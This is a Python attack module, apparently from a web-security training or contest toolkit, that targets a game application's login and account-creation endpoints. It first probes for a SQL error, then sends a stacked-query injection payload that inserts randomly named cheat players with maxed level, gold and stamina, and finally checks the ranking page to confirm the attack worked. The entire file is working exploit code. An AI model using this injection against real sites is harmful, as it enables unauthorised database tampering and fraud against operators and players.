#!/usr/bin/env python
# coding: UTF-8
import requests
import json
import sys
import re
import time
import hashlib
import random
from os import urandom

class AtkGameCheatSQLi(object):
    def __init__(self, utility, host="127.0.0.1", port="80", debug=False):
        self.utility = utility
        self.host = host
        self.port = port
        self.ua = utility.ua
        self.debug = debug
        self.description = "The module can be create cheat users if SQLi is not fix yet."
        self.target = host + ":" + port

    def __str__(self):
        return 'AtkGameCheatSQLi object (target: %s, description: %s)' % (self.target, self.description)

    __repr__ = __str__
    
    def sendattack(self, target_path, num):
        #proxy
        #proxies = {"http": "http://127.0.0.1:8080","https": "http://127.0.0.1:8080"}
        proxies = {"http": None,"https": None}

        #connect timeout, read timeout
        timeoutvalue= (5.0, 5.5)

        target_url = "http://" + self.target + target_path

        search_object1 = re.search(r"http://(.*)/" , target_url)
        target_host = search_object1.group(1)

        search_object2 = re.search(r".*/([^/].*)$" , target_path)
        content_flag = search_object2.group(1)

        self.logger("target_path: %s" % content_flag, "+")

        # List of nick_name
        namelist = ["Amuro","Char","Levi","Ellen","Conan","Naruto","Kenshin","Luffy","Goku","Jyotaro","Dio","Tanjiro","Itadori","Saber","Archer","Shiro","Kamijyo","Allen","Shinji","Sakuragi","Subaru","Edward","Accelerator","Ranma","Araragi","Gon","Killua","Tatuya","Kirito","Asuna","Kaneki","Lelouch","Mari","Rei","Asuka","Pazu","Sheeta","Musuka","Megumin","Kazuma","Misato","Shana","Tumugi","Ritu","Azusa","Yui","Homura","Madoka","Eru","Nausicaa","Mikoto","Haruhi","Lem"]

        try:
            self.logger("Attack Start", "+")

            session = requests.Session()

            if content_flag == "login":
                json_data = { "user_name": "hack", "password": "'"}            
            
            if content_flag == "create":
                json_data = { "user_name": "'", "password": "password", "nick_name":"hack"}      

            headers = { "Content-Type": "application/json", "User-Agent": self.ua }
            response1 = session.post(target_url, data=json.dumps(json_data), headers=headers, proxies=proxies, timeout=timeoutvalue)

            print("-----sqli check-----")
            print("Status code:   %i" % response1.status_code)
            print("Response body: %s" % response1.text)

            regex = re.compile(r"%s" % re.escape("SQLSTATE[42000]"))

            if regex.search(response1.text):
                self.logger("Oh my god! It's Vulnerable…", "+")   
            else:
                self.logger("Maybe SQLi has been fixed?", "!")

            head ="';INSERT INTO player (user_name, password, nick_name, image, level, stamina, weapon_id, armor_id, gold, exp, created_at, staminaupdated_at) "
            end = ";-- "
            middle ="VALUES "
            injectuserid = [] 

            for i in range(num):
            
                setid = hashlib.sha256(urandom(10)).hexdigest()
                setpassword = urandom(10).hex()
                nickname_token = hashlib.md5(urandom(10)).hexdigest()[:10]
                setnickname = random.choice(namelist) + "_" + nickname_token
                time_stamp = time.strftime('%Y-%m-%d %H:%M:%S')
                sqlparts = "('" + setid + "', '" + setpassword + "', '" + setnickname +"', '', 99, 9999999, 1, 1, 9999999, 9999999, '" + str(time_stamp) + "', '"+ str(time_stamp) + "')"
                middle = middle + sqlparts

                injectuserid.append(setnickname)

                if i < (num -1):
                    middle = middle + ","

            payload = head + middle + end

            if content_flag == "login":
                json_data = { "user_name": "hack", "password": payload}            
            
            if content_flag == "create":
                json_data = { "user_name": payload, "password": "password", "nick_name":"hack"}    

            headers = { "Content-Type": "application/json", "User-Agent": self.ua }
            response2 = session.post(target_url, data=json.dumps(json_data), headers=headers, proxies=proxies, timeout=timeoutvalue)

            print("-----execute sqli----")
            print("Status code:   %i" % response2.status_code)
            print("Response body: %s" % response2.content)

            self.logger("Attack complete", "+")

            target_url = "http://" + target_host + "/ranking"
            headers = { "Content-Type": "application/json", "User-Agent": self.ua }
            response3 = session.get(target_url, proxies=proxies, headers=headers, timeout=timeoutvalue)

            print("-----ranking-----")
            print("Status code:   %i" % response3.status_code)
            print("Response body: %s" % response3.content)

            pattern = "|".join(injectuserid)

            regex = re.compile(r"%s" % pattern)

            if regex.search(response3.text):
                self.logger("Attack SUCCESS!", "+")   
            else:
                self.logger("May be Attack failed?", "!")

        except requests.exceptions.RequestException as e:
            self.logger("Error occurred", "!")
            file=sys.stderr
            print(e)
            #sys.exit(1)


    def logger(self, m="", o="+"):
        message = "[{}] {}".format(o,m)
        print(message)

